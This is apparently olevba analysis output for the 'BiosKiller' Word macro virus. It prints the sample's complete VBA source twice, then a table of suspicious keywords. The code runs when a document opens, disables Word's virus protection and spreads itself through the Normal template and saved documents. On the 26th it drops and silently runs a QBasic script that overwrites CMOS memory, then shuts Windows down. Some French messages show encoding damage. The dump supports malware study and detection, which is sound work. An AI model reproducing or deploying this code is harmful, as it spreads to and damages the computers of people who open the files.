olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Biok.a-0c5944f1157b2b794d7fd565da52b81af7f08ee1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BiosKiller.cls 
in file: Virus.MSWord.Biok.a-0c5944f1157b2b794d7fd565da52b81af7f08ee1 - OLE stream: 'Macros/VBA/BiosKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAuEx
Call PayBiosKiller
ErrorAuEx:
End Sub
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDOp
iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "BiosKiller" Then
        BiosKillerInstalled = -1
    End If
Next i
If Not BiosKillerInstalled Then
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
End If
ErrorDOp:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSAs
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDocumentCount
If ActiveDocument.VBProject.VBComponents(i).Name = "BiosKiller" Then
    BiosKillerDocInstalled = -1
End If
Next i
If Not BiosKillerDocInstalled Then
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents.Import "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
ActiveDocument.Save
End If
ErrorFSAs:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFiTe
MsgBox "Vous feriez mieux de vous acheter un AV...", vbCritical, "Virus BiosKiller"
ErrorFiTe:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHeAb
CommandBars("Help").Controls(5).Caption = "A propos du Virus BiosKiller"
APVBK.Show
ErrorHeAb:
End Sub
Sub PayBiosKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBK
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
Tm$ = Mid(MyTime, 4, 5)
Ts$ = Mid(MyTime, 7, 8)
D1$ = Mid(MyDate, 1, 2)
If (Tm$ = "26") Or (Ts$ = "26") Then
    MsgBox "Vous connaissez le virus CIH ?" & Chr$(13) & "Je fais la mкme chose que lui...", vbCritical, "Virus BiosKiller"
End If
If D1$ = "26" Then
    MsgBox "Votre Bios va subir des changements..." & Chr$(13) & "HAHAHAHAHA", vbCritical, "Virus BiosKiller"
Open "C:\CMOS.bas" For Output As #1
    Print #1, "CLS"
    Print #1, "Screen 9"
    Print #1, "Color 4"
    Print #1, "DIM Byte AS STRING * 1"
    Print #1, "For CMOS = 1 To LOF(1)"
    Print #1, "OUT &H70, CMOS - 1"
    Print #1, "GET #1, , Byte"
    Print #1, "OUT &H71, ASC(Byte)"
    Print #1, "Next"
    Print #1, "Print ""Votre Bios a йtй flashй, HAHAHAHAHA!!!"""
    Print #1, "System"
Close #1
Shell "qbasic /run C:\CMOS.bas", vbHide
MsgBox "Votre bios a йtй flashй..." & Chr$(13) & "Je vais redйmarrer votre ordinateur...", vbInformation, "Virus BiosKiller"
Tasks.ExitWindows
End If
ErrorPBK:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToMa
MsgBox "Je suis un virus comme CIH...", vbCritical, "Virus BiosKiller"
ErrorToMa:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBCo
ErrorVVBCo:
End Sub
-------------------------------------------------------------------------------
VBA MACRO BiosKiller1.cls 
in file: Virus.MSWord.Biok.a-0c5944f1157b2b794d7fd565da52b81af7f08ee1 - OLE stream: 'Macros/VBA/BiosKiller1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAuEx
Call PayBiosKiller
ErrorAuEx:
End Sub
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDOp
iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "BiosKiller" Then
        BiosKillerInstalled = -1
    End If
Next i
If Not BiosKillerInstalled Then
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
End If
ErrorDOp:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSAs
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDocumentCount
If ActiveDocument.VBProject.VBComponents(i).Name = "BiosKiller" Then
    BiosKillerDocInstalled = -1
End If
Next i
If Not BiosKillerDocInstalled Then
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents.Import "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
ActiveDocument.Save
End If
ErrorFSAs:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFiTe
MsgBox "Vous feriez mieux de vous acheter un AV...", vbCritical, "Virus BiosKiller"
ErrorFiTe:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHeAb
CommandBars("Help").Controls(5).Caption = "A propos du Virus BiosKiller"
APVBK.Show
ErrorHeAb:
End Sub
Sub PayBiosKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBK
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
Tm$ = Mid(MyTime, 4, 5)
Ts$ = Mid(MyTime, 7, 8)
D1$ = Mid(MyDate, 1, 2)
If (Tm$ = "26") Or (Ts$ = "26") Then
    MsgBox "Vous connaissez le virus CIH ?" & Chr$(13) & "Je fais la mкme chose que lui...", vbCritical, "Virus BiosKiller"
End If
If D1$ = "26" Then
    MsgBox "Votre Bios va subir des changements..." & Chr$(13) & "HAHAHAHAHA", vbCritical, "Virus BiosKiller"
Open "C:\CMOS.bas" For Output As #1
    Print #1, "CLS"
    Print #1, "Screen 9"
    Print #1, "Color 4"
    Print #1, "DIM Byte AS STRING * 1"
    Print #1, "For CMOS = 1 To LOF(1)"
    Print #1, "OUT &H70, CMOS - 1"
    Print #1, "GET #1, , Byte"
    Print #1, "OUT &H71, ASC(Byte)"
    Print #1, "Next"
    Print #1, "Print ""Votre Bios a йtй flashй, HAHAHAHAHA!!!"""
    Print #1, "System"
Close #1
Shell "qbasic /run C:\CMOS.bas", vbHide
MsgBox "Votre bios a йtй flashй..." & Chr$(13) & "Je vais redйmarrer votre ordinateur...", vbInformation, "Virus BiosKiller"
Tasks.ExitWindows
End If
ErrorPBK:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToMa
MsgBox "Je suis un virus comme CIH...", vbCritical, "Virus BiosKiller"
ErrorToMa:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBCo
ErrorVVBCo:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

